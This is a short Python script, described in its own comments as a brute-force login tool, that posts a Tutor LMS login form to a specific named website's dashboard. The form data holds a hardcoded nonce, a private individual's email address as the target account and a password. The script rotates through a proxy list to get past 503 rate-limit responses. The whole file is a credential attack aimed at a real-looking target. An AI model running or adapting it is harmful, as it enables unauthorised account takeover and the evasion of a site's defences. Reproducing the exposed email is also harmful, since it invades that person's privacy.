import requests
import threading

# URL for the brute-force login
url = "https://coaching.supernovas.indrive.com/dashboard/"

# Data payload for the login form
data = {
    '_tutor_nonce': '496eb8cd34',
    '_wp_http_referer': '/dashboard/',
    'tutor_action': 'tutor_user_login',
    'redirect_to': 'https://coaching.supernovas.indrive.com/dashboard/',
    'log': 'jamaalahmed1906@gmail.com',
    'pwd': '11234'
}

# Proxy list file (one proxy per line)
proxy_list_file = "proxylist.txt"

# Function to read proxy list from a file
def read_proxies(file):
    with open(file, 'r') as f:
        proxies = f.readlines()
    return [proxy.strip() for proxy in proxies]

# Function to try the login request with a given proxy
def attempt_login(proxy):
    proxies = {
        'http': f'http://{proxy}',
        'https': f'https://{proxy}'
    }
    try:
        response = requests.post(url, data=data, proxies=proxies)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error with proxy {proxy}: {e}")
        return None

# Main brute-force logic with proxy rotation
def brute_force_with_proxy_rotation():
    proxies = read_proxies(proxy_list_file)
    
    for proxy in proxies:
        print(f"Using proxy: {proxy}")
        response = attempt_login(proxy)
        
        if response is not None:
            if response.status_code == 503:
                print(f"Received 503, rotating proxy...")
                continue  # Move to the next proxy in the list
            else:
                print(f"Successful login or other status code received: {response.status_code}")
                break  # Exit if successful or handle other status codes
        else:
            print(f"Failed to send request with proxy {proxy}")
    
    print("Brute-force attempt finished.")

# Run the brute-force with proxy rotation
brute_force_with_proxy_rotation()
